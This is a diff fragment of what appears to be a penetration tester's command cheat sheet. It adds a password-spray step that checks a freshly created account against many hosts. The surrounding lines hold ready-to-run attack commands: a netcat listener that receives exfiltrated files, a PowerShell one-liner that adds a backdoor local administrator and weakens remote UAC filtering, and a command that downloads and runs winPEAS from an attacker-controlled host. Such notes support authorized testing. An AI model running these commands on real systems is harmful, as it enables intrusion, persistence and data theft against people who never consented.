@@ -1326,6 +1326,9 @@ rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
 +---------- Create Account ----------+
 powershell -c "Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }"
 
++---------- Verify Access ----------+
+sprayme 'dbf:123qweasdF!' hosts
+
 [*] Privilege Escalation
 +---------- Priv Check ----------+
 powershell -c "curl $MYIP/windows/winPEASofs.exe -o \programdata\winPEASofs.exe; \programdata\winPEASofs.exe"
